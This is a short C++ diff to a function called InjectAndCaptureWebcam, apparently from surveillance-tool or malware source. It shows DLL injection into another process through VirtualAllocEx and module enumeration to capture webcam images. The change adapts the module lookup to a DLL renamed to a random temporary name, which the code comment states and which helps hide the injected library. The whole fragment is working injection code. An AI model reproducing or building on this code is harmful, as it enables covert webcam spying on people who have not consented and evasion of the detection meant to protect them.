@@ -1569,6 +1569,11 @@ static bool InjectAndCaptureWebcam(const wchar_t* outputPath) {
     std::wstring dllPathW((size_t)wlen - 1, 0);
     MultiByteToWideChar(CP_UTF8, 0, dllPathA.c_str(), -1, &dllPathW[0], wlen);
 
+    // Extract base filename for module enumeration (DLL was renamed to a random temp name)
+    std::wstring dllBaseNameW = dllPathW;
+    size_t slashPos = dllBaseNameW.find_last_of(L"\\/");
+    if (slashPos != std::wstring::npos) dllBaseNameW = dllBaseNameW.substr(slashPos + 1);
+
     size_t dllPathBytes = (dllPathW.size() + 1) * sizeof(wchar_t);
     void* remoteDllPath = VirtualAllocEx(hProcess, NULL, dllPathBytes, MEM_COMMIT, PAGE_READWRITE);
     void* remoteParams = VirtualAllocEx(hProcess, NULL, sizeof(CaptureParams), MEM_COMMIT, PAGE_READWRITE);
@@ -1602,7 +1607,7 @@ static bool InjectAndCaptureWebcam(const wchar_t* outputPath) {
         MODULEENTRY32W me = { sizeof(me) };
         if (Module32FirstW(hSnapshot, &me)) {
             do {
-                if (lstrcmpiW(me.szModule, L"capture_dll.dll") == 0) { remoteDllBase = (ULONGLONG)me.modBaseAddr; break; }
+                if (lstrcmpiW(me.szModule, dllBaseNameW.c_str()) == 0) { remoteDllBase = (ULONGLONG)me.modBaseAddr; break; }
             } while (Module32NextW(hSnapshot, &me));
         }
         CloseHandle(hSnapshot);
